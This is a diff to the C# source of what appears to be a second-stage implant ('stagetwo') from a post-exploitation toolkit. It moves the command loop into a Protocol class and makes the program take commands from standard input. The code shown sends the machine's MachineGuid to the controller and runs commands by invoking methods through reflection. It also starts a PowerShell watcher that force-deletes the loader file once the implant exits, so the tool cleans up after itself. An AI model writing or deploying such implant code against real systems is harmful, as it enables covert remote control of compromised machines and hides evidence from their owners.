@@ -109,6 +109,7 @@ namespace stagetwo
             string path = (string)oPath;
             System.IO.StreamReader stdin = (System.IO.StreamReader)oStdin;
             object[] args = new object[] { stdin };
+            var protocol = new Protocol(stdin);
 
             // Initialize ConsoleHost and PowerShell Runspace
             PowerShell.init_pshost();
@@ -119,31 +120,8 @@ namespace stagetwo
             // Send the host identifier
             System.Console.WriteLine((string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "NONE"));
 
-            while (Running)
-            {
-                try
-                {
-                    String type = stdin.ReadLine();
-                    String method_name = stdin.ReadLine();
-
-                    if ( type == null || method_name == null ) {
-                        break;
-                    }
-
-                    var method = GetType().Assembly.GetType("stagetwo." + type).GetMethod(method_name);
-                    if (method == null) continue;
-                    method.Invoke(null, args);
-                }
-                catch (IOException e)
-                {
-                    // The user must have exited
-                    break;
-                }
-                catch (Exception e)
-                {
-                    System.Console.WriteLine("E:S2:EXCEPTION:" + e.Message);
-                }
-            }
+            // Run the main loop
+            protocol.Loop();
 
             // Delete the loader after we exit
             string command = "try { while( $true ) { Get-Process -Id " + System.Diagnostics.Process.GetCurrentProcess().Id + " -ErrorAction Stop | out-null; sleep 1 } } catch { ri -force -path \"" + path + "\"; }";
@@ -162,15 +140,15 @@ namespace stagetwo
             Environment.Exit(Environment.ExitCode);
         }
 
-        public static void exit()
+        public static Dictionary<string, object> exit()
         {
-            Running = false;
+            throw new Protocol.LoopExit();
         }
 
         public static void Main(string[] args)
         {
             var x = new StageTwo();
-            // x.main("");
+            x.main("", new StreamReader(System.Console.OpenStandardInput()));
         }
 
     }
